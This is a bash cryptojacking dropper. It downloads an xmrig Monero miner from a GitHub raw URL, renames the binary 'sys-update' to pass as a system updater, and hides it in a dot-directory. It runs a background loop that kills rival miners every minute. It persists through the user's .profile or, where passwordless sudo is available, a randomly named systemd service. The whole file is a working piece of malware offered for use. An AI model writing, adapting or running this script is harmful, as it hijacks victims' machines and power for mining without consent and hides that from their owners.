#!/usr/bin/env bash
set -euo pipefail

if grep -q $'\r' "$0"; then
  sed -i 's/\r$//' "$0"
  exec bash "$0" "$@"
fi

HOME_DIR="${HOME_DIR:-$HOME}"
[ "$(id -u)" -eq 0 ] && HOME_DIR="/tmp"

BASE_DOWNLOAD_URL="https://raw.githubusercontent.com/t69415778/test/refs/heads/main"

kill_processes_by_name() {
  local process_name="$1"
  local pids

  if command -v pgrep &>/dev/null; then
    pids=$(pgrep -f "$process_name" || true)
  else
    pids=$(ps aux | grep "$process_name" | grep -v grep | awk '{print $2}' || true)
  fi

  if [ -n "$pids" ]; then
    kill "$pids" 2>/dev/null || true
  fi
}

if command -v pidof &>/dev/null; then
  if pidof sys-update &>/dev/null; then
    exit 0
  fi
else
  if command -v pgrep &>/dev/null; then
    if pgrep -f sys-update &>/dev/null; then
      exit 0
    fi
  else
    if ps aux | grep "sys-update" | grep -v grep &>/dev/null; then
      exit 0
    fi
  fi
fi

kill_processes_by_name "terminate_miners.sh"

cat > /tmp/terminate_miners.sh <<'EOL'
#!/bin/bash
set -euo pipefail

kill_processes_by_name() {
  local process_name="$1"
  local pids

  if command -v pgrep &>/dev/null; then
    pids=$(pgrep -f "$process_name" || true)
  else
    pids=$(ps aux | grep "$process_name" | grep -v grep | awk '{print $2}' || true)
  fi

  if [ -n "$pids" ]; then
    kill -9 "$pids" 2>/dev/null || true
  fi
}

miners=("xmrig" "cgminer" "bfgminer" "ethminer" "minerd" "cpuminer" "nicehash" "claymore" "phoenixminer" "ccminer")

while true; do
  for miner in "${miners[@]}"; do
    kill_processes_by_name "$miner"
  done
  sleep 60
done
EOL

chmod +x /tmp/terminate_miners.sh
/tmp/terminate_miners.sh &

download_file() {
  local url=$1
  local output=$2
  if command -v curl &>/dev/null; then
    curl -L -s -S "$url" -o "$output" || exit 1
  elif command -v wget &>/dev/null; then
    wget -q -O "$output" "$url" || exit 1
  elif command -v python3 &>/dev/null; then
    python3 -c "import urllib.request; urllib.request.urlretrieve('$url', '$output')" || exit 1
  elif command -v python2 &>/dev/null; then
    python2 -c "import urllib; urllib.urlretrieve('$url', '$output')" || exit 1
  else
    exit 1
  fi
  [ -s "$output" ] || exit 1
}

generate_random_string() {
  local length=12
  local chars=({a..z} {A..Z} {0..9})
  local random_string=""
  for _ in $(seq 1 "$length"); do
    random_string+="${chars[RANDOM % ${#chars[@]}]}"
  done
  echo "$random_string"
}

add_user_autostart() {
  if ! grep -q "$MINER_DIR/miner.sh" "$HOME_DIR/.profile"; then
    echo "$MINER_DIR/miner.sh --config=$MINER_DIR/config.json &" >> "$HOME_DIR/.profile"
  fi
  nohup "$MINER_DIR/miner.sh" --config="$MINER_DIR/config.json" 2>/dev/null &
}

MINER_DIR=$(mktemp -d "$HOME_DIR/.miner-XXXXXX")

download_file "$BASE_DOWNLOAD_URL/xmrig" "$MINER_DIR/sys-update"
chmod +x "$MINER_DIR/sys-update"
download_file "$BASE_DOWNLOAD_URL/config.json" "$MINER_DIR/config.json"

cat >"$MINER_DIR/miner.sh" <<EOL
#!/usr/bin/env bash
set -euo pipefail
ulimit -n 65535
if ! pidof sys-update &>/dev/null; then
  chmod +x "$MINER_DIR/sys-update"
  "$MINER_DIR/sys-update" "\$@"
fi
EOL
chmod +x "$MINER_DIR/miner.sh"

RANDOM_SERVICE_NAME="miner_$(generate_random_string)"

if ! sudo -n true 2>/dev/null; then
  add_user_autostart
else
  if command -v systemctl &>/dev/null; then
    sudo bash -c "cat >/etc/systemd/system/${RANDOM_SERVICE_NAME}.service" <<EOL
[Unit]
Description=Monero miner service
After=network-online.target

[Service]
ExecStart=$MINER_DIR/sys-update --config=$MINER_DIR/config.json
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOL
    sudo systemctl daemon-reload
    sudo systemctl enable "${RANDOM_SERVICE_NAME}.service"
    sudo systemctl start "${RANDOM_SERVICE_NAME}.service"
  else
    add_user_autostart
  fi
fi
